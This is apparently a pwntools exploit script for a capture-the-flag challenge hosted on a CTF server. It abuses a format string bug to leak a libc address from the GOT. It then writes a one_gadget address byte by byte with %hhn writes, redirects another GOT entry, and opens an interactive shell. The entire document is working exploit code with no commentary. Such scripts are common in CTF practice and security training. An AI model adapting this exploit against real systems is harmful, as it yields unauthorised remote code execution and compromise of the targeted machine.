from pwn import *

#r = process("./nothing")
r = remote("pwn02.chal.ctf.westerns.tokyo", 18247)

def fmt(q):
	r.recvuntil("> ")
	r.send(q)

addr = 0x000000000601018
fmt("%00000000000x %10$sAAAABBBBCCCCD" + p64(addr))
leak = r.recvuntil("\x7f") + "\x00"*2
leak = u64(leak[-8:])
print(hex(leak))

addr = 0x000000000601018
#libc_base = leak - 0x809c0
libc_base = leak - 0x080a30

#onegad = libc_base + 0x10a38c
onegad = libc_base + 0x10a45c
pay = p64(onegad)[:6]
print(hex(onegad))
for i in range(len(pay)):
	fmt("%{}x %10$hhnAABBBBCCCCD".format(str(ord(pay[i]) - 1).zfill(11)) + p64(addr + i))
addr = 0x0000000000601028
writeto = 0x000000000400590
pause()
fmt("%{}x %10$lnAAABBBBCCCCD".format(str(writeto - 1).zfill(11)) + p64(addr))


r.interactive()

